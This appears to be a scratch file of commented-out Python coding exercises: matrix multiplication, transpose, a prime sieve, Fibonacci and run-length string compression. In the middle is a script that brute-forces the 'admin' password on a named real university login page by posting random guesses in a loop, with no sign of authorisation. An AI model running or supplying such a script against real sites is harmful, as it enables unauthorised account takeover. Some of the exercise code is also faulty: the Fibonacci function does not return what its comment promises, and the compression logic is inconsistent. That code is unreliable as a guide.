# # Define the matrices as lists of lists
# matrix1 = [[1, 2, 3],
#            [4, 5, 6],
#            [7, 8, 9]]

# matrix2 = [[10, 11, 12],
#            [13, 14, 15],
#            [16, 17, 18]]

# # Get the dimensions of the matrices
# rows1 = len(matrix1)
# cols1 = len(matrix1[0])
# cols2 = len(matrix2[0])

# # Create an empty result matrix
# result = [[0 for _ in range(cols2)] for _ in range(rows1)]

# # Perform matrix multiplication
# for i in range(rows1):
#     for j in range(cols2):
#         for k in range(cols1):
#             result[i][j] += matrix1[i][k] * matrix2[k][j]

# # Print the result matrix
# for row in result:
#     print(row)




# # def transpose(matrix):
# #     return list(map(list, zip(*matrix)))
# #a function to make transpose of a matrix
# def transpose(matrix):
#     return list(map(list, zip(*matrix)))

# #write a function to brute force passwords at online.uom.lk/login
# # import requests
# # import time
# # import string
# # import random
# # import numpy as np

# def brute_force_password():
#     url = 'http://online.uom.lk/login'
#     username = 'admin'
#     password = ''
#     while True:
#         password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
#         data = {'username': username, 'password': password}
#         response = requests.post(url, data=data)
#         if response.url != url:
#             print('Password found:', password)
#             break
#         print('Trying password:', password)
#         time.sleep(1)

# brute_force_password()
# #write a function to brute force passwords at online.uom.lk/login


# n=1
# #finding prime numbers
# def sieve_of_eratosthenes(n):
#     primes = [True] * (n + 1)
#     primes[0] = primes[1] = False

#     p = 2
#     while p * p <= n:
#         if primes[p]:
#             for i in range(p * p, n + 1, p):
#                 primes[i] = False
#         p += 1

#     return [i for i in range(n + 1) if primes[i]]


# # write a function to find fibonacci even numbers less than 1000
# def fibonacci_numbers(n):
#     if n <= 0:
#         return []
#     elif n == 1:
#         return [0]
#     elif n == 2:
#         return [0, 1]
    
#     # Create the Fibonacci matrix
#     fib_matrix = np.array([[1, 1], [1, 0]])
    
#     # Raise the matrix to the power of n-2
#     fib_matrix_power = np.linalg.matrix_power(fib_matrix, n-2)
    
#     # Calculate the first two Fibonacci numbers
#     fib_numbers = [0, 1]
    
#     # Multiply the matrix with the initial Fibonacci numbers
#     fib_numbers = np.dot(fib_numbers, fib_matrix_power)
    
#     # Convert the result to a list
#     fib_numbers = fib_numbers.tolist()
    
#     return fib_numbers

# # Call the function to find Fibonacci numbers
# fibonacci_sequence = fibonacci_numbers(10)
# print(fibonacci_sequence)


# #write a function that takes a string like "aabcccd" and returns a string like "a2b1c3d1" and if all numbers are 1 return the input string instead
# def compress_string(s):
#     compressed = ""
#     count = 1  
#     for i in range(1, len(s)):
#         if s[i] == s[i-1]:
#             count += 1
#         else:
#             compressed += s[i-1] + str(count)
#             count = 1

#     compressed += s[-1] + str(count) if count > 1 else s[-1]

#     return compressed if any(char.isdigit() and char != '1' for char in compressed) else s

# print(compress_string("aabcccd"))


# a = 'aaaabcccdaa'

# if len(a)==len(set(a)):
#     print(a)
#     exit()
# else:
#     prev = ''
#     count = 1
#     out = ''
#     for i in a:
#         if prev == i:
#             count+=1
#         else:
#             out += prev + str(count)
#             prev = i
#             count = 1
#     else:
#         out += prev + str(count)
#     print(out[1:])


